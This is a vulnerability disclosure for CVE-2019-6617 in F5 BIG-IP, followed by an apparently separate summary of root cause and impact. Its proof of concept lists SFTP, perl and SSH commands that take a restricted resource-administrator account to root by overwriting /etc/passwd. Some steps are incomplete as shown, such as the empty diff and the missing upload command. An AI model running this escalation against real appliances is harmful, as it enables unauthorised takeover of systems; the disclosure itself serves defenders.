Title: F5 BIG-IP Resource Administrator Privilege Escalation
Author: Rich Mirch
CVE: CVE-2019-6617
Vendor Advisory: https://support.f5.com/csp/article/K38941195
Description
An F5 BIG-IP account with the resource administrator role while also having terminal access disabled still has the ability to access the appliance via SFTP as root. This PoC will show that a resource administrator can obtain root access to the appliance and take full control with terminal access disabled.

Technical details
A local account configured with the resource administrator role is created as a Linux user with uid set to zero/root. SSH is not allowed when terminal access is disabled. The problem is that the SFTP service is still allowed without any restrictions. Since a resource administrator account is a Linux root account, it has the ability to overwrite any file on the system.
Note: The SSH service must be enabled and the management interface accessible.

CVSS
Vector: CVSS:3.0/AV:N/AC:L/PR:H/UI:N/S:U/C:H/I:H/A:H/E:H/RL:O/RC:C
Base: 7.2
Temporal: 6.9

Proof Of Concept
[Step 1]
Show that resadmin is not allowed to SSH.
$ ssh resadmin@5.6.7.8
Password:
Last login: Thu Sep 13 15:23:23 2018 from 1.2.3.4
This account is currently not available.
Connection to 5.6.7.8 closed.
[Step 2]
Connect to the appliance as resadmin via SFTP and retrieve the /etc/passwd file.
$ /usr/bin/sftp resadmin@5.6.7.8
Password:
Connected to 5.6.7.8.
sftp> get /etc/passwd
Fetching /etc/passwd to passwd
/etc/passwd 100% 1423 229.8KB/s 00:00
sftp> quit
[Step 3]
Update the local passwd file and change /sbin/nologin to /bin/bash for the resadmin user.
$ perl -p -i.orig -e 's!/sbin/nologin!/bin/bash! if /^resadmin/;' passwd
[Step 4]
Display a diff of the passwd change from step 3.
$ diff -u passwd.orig passwd
--- passwd.orig 2018-09-13 17:32:55.000000000 -0500
+++ passwd 2018-09-13 17:34:36.000000000 -0500

[Step 5]
SFTP as resadmin and upload the modified passwd file to /etc/passwd.
$ /usr/bin/sftp resadmin@5.6.7.8

[Step 6]
Login as resadmin via SSH and obtain a bash shell running as the root user.
$ ssh resadmin@5.6.7.8
Password:

```

- **Root cause of vulnerability:** BIG-IP's resource administrator role, despite having terminal access disabled, could still access the appliance via SFTP. Resource administrator accounts were created as Linux root accounts, granting them unrestricted SFTP access and the ability to overwrite system files.
- **Weakness:** Unrestricted SFTP access for resource administrator accounts, even with terminal access disabled, and the ability to overwrite system files.
- **Impact:** Privilege escalation to root. An attacker with resource administrator privileges could gain full control of the BIG-IP system by modifying the /etc/passwd file to enable SSH access for the resadmin account.
- **Attack vector:**
  1.  Gain resource administrator privileges.
  2.  Connect to the BIG-IP appliance via SFTP.
  3.  Download the /etc/passwd file.
  4.  Modify the /etc/passwd file to change the shell for the resadmin user from /sbin/nologin to /bin/bash.
  5.  Upload the modified /etc/passwd file back to the appliance.
  6.  Connect to the appliance via SSH as the resadmin user to obtain a root shell.
- **Required attacker capabilities/position:** The attacker needs to have resource administrator privileges on the BIG-IP system and the ability to access the management interface (SSH service enabled).
